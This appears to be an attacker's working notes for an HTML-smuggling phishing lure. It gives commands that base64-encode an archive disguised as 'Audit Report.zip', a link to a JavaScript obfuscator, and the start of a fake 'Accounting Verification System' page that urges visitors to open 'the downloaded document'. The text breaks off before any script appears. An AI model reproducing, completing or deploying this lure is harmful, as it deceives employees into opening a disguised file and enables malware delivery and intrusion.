##### get B64:
```
cat 'Audit Report.zip' | base64 | tr -d '\n' | tee aa
base64 'Audit Report.zip' | tr -d '\n' | tee aa
```
##### obfuscate js:
<https://obfuscator.io/>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Company Verification</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background: url('<https://img.freepik.com/free-photo/close-up-smiley-woman-with-laptop_23-2149300649.jpg?w=1380&t=st=1700394697~exp=1700395297~hmac=50fa3b14e80a85e397caaf7ea21cfa3d9f852ffd876a10d381e441169ad327b8')> center/cover no-repeat fixed;
            color: #333;
            text-align: center;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        h1 {
            color: #fff;
            font-size: 36px;
            margin: 20px 0;
        }

        h2 {
            color: #fff;
            font-size: 18px;
            line-height: 1.6;
        }
         h2 {
            color: #fff;
            font-size: 18px;
            line-height: 1.6;
        }
    </style>
</head>
<body>
    <main>
        <h1>Accounting Verification System</h1>
        <h2>Please verify the downloaded document to confirm the accuracy of the company details</h2>
        <h2>Contact our email as soon as information has been verified</h2>
    </main>
